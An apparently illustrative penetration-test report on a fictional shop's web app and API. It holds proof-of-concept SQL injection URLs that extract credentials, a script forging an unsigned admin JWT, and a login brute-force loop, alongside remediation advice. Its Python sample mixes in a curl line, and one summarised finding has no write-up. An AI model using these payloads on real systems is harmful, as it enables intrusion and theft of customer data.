# Guardian Mode Example: Penetration Testing Engagement

**Mode**: Guardian  
**Type**: Security Assessment  
**Date**: 2024-01-15  
**Duration**: 4 hours

---

## Context

A mid-sized e-commerce company ("ShopEase") has engaged us to conduct a penetration test of their customer-facing web application and internal API. ShopEase processes approximately 10,000 transactions daily and stores customer PII including names, addresses, and payment information.

**Scope**:
- External web application (https://shop.example.com)
- REST API (https://api.shop.example.com)
- Authentication systems
- Payment processing integration

**Limitations**:
- No social engineering testing
- No physical security assessment
- Testing window: 8 AM - 6 PM EST

---

## Objective

Identify critical and high-severity vulnerabilities that could:
1. Expose customer PII
2. Compromise payment card data
3. Allow unauthorized administrative access
4. Disrupt service availability

---

## Execution

### Phase 1: Reconnaissance

#### External Footprinting

```
Target: shop.example.com
IP Range: 203.0.113.0/24
DNS Records:
  - shop.example.com -> 203.0.113.10
  - api.shop.example.com -> 203.0.113.20
  - www.shop.example.com -> 203.0.113.10
```

#### Technology Discovery

| Endpoint | Technologies Detected |
|----------|---------------------|
| shop.example.com | Nginx 1.24.0, WordPress 6.4.2, PHP 8.1 |
| api.shop.example.com | Node.js 18.x, Express 4.18 |

---

### Phase 2: Vulnerability Assessment

#### Critical Findings

##### VULN-001: SQL Injection in Product Search

**Severity**: CRITICAL  
**CVSS**: 9.8

**Description**: The product search endpoint is vulnerable to SQL injection via the `q` parameter.

**Proof of Concept**:

```bash
# Boolean-based blind SQLi
curl -X GET \
  "https://api.shop.example.com/products/search?q=test'%20AND%201=1--"

# Response: 200 OK with results
curl -X GET \
  "https://api.shop.example.com/products/search?q=test'%20AND%201=2--"

# Response: 200 OK with empty results (vulnerable)

# Union-based extraction
curl -X GET \
  "https://api.shop.example.com/products/search?q=test'%20UNION%20SELECT%20NULL,username,password,NULL,NULL,NULL%20FROM%20users--"
```

**Impact**: Full database compromise, including:
- 50,000+ customer records
- Admin credentials
- Transaction history

**Remediation**:
```sql
-- Implement parameterized queries
PREPARE statement FROM 'SELECT * FROM products WHERE name LIKE ?';
SET @search = CONCAT('%', ?, '%');
EXECUTE statement USING @search;
```

##### VULN-002: Broken Authentication - JWT None Algorithm

**Severity**: HIGH  
**CVSS**: 8.1

**Description**: The API accepts JWT tokens using the "none" algorithm, allowing token forgery.

**Proof of Concept**:

```python
import jwt

# Create malicious token
payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1705312800,
    "exp": 1705399200
}

# None algorithm - unsigned
malicious_token = jwt.encode(payload, "", algorithm="none")
print(malicious_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...

# Use token to access admin endpoint
curl -H "Authorization: Bearer eyJhbGciOiJub25l..." \
  https://api.shop.example.com/admin/users
# Response: 200 OK - Full user list exposed
```

**Remediation**:
```yaml
# Enforce strong JWT configuration
jwt:
  algorithm: RS256
  issuer: shop.example.com
  audience: api.shop.example.com
  expiration: 3600
```

#### High Severity Findings

##### VULN-003: Sensitive Data Exposure in API Responses

**Severity**: HIGH  
**CVSS**: 7.5

**Description**: API responses include sensitive internal fields including database IDs and internal error messages.

**Example Response**:
```json
{
  "id": 12345,
  "name": "John Doe",
  "email": "john@example.com",
  "_internal": {
    "db_id": 98765,
    "error_threshold": 500,
    "debug_mode": true
  }
}
```

##### VULN-004: Missing Rate Limiting on Authentication Endpoints

**Severity**: HIGH  
**CVSS**: 7.4

**Description**: Login endpoint has no rate limiting, enabling brute force attacks.

**Proof**:
```bash
# Attempt 100 login attempts
for i in {1..100}; do
  curl -X POST \
    -d "username=admin@shop.example.com&password=attempt$i" \
    https://api.shop.example.com/auth/login
done

# All requests processed - no lockout or delay
```

---

### Phase 3: Privilege Escalation Testing

#### Horizontal Privilege Escalation

Using SQL injection to access other user accounts:

```bash
curl -X GET \
  "https://api.shop.example.com/products/search?q=test'\
   UNION%20SELECT%20id,email,NULL,NULL,NULL,NULL,NULL\
   FROM%20(SELECT%20id,email%20FROM%20users%20LIMIT%2010)%20AS%20users--"
```

Successfully extracted emails of 10 random users.

#### Vertical Privilege Escalation

From regular user to admin via JWT manipulation:

1. Obtained valid user token via SQL injection
2. Modified token claims to add admin role
3. Token accepted with elevated privileges
4. Full admin API access achieved

---

## Findings Summary

| ID | Vulnerability | Severity | CVSS | Status |
|----|--------------|----------|------|--------|
| VULN-001 | SQL Injection in Search | CRITICAL | 9.8 | Open |
| VULN-002 | JWT None Algorithm | HIGH | 8.1 | Open |
| VULN-003 | Sensitive Data Exposure | HIGH | 7.5 | Open |
| VULN-004 | Missing Rate Limiting | HIGH | 7.4 | Open |
| VULN-005 | CSRF on Password Reset | MEDIUM | 6.1 | Open |

---

## Recommendations

### Immediate Actions (Within 24 Hours)

1. **VULN-001 - SQL Injection**
   - Implement input validation and parameterized queries
   - Deploy Web Application Firewall (WAF) rule
   - Conduct emergency code review of all database queries

2. **VULN-002 - JWT None Algorithm**
   - Disable "none" algorithm support
   - Rotate all active tokens
   - Implement token blacklisting

### Short-term Actions (Within 1 Week)

3. Review and sanitize all API responses
4. Implement rate limiting on authentication endpoints
5. Enable comprehensive request logging

### Long-term Actions (Within 1 Month)

6. Implement comprehensive security testing in CI/CD
7. Conduct security training for development team
8. Establish bug bounty program

---

## Appendix

### Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Web vulnerability scanning |
| sqlmap | SQL injection verification |
| JWT.io | JWT token analysis |
| nmap | Network reconnaissance |
| OWASP ZAP | Automated vulnerability scanning |

### References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [JWT Best Practices](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

---

## Next Steps

1. Schedule remediation review call with development team
2. Provide implementation guidance for fixes
3. Schedule follow-up penetration test in 30 days
4. Deliver final report to stakeholders
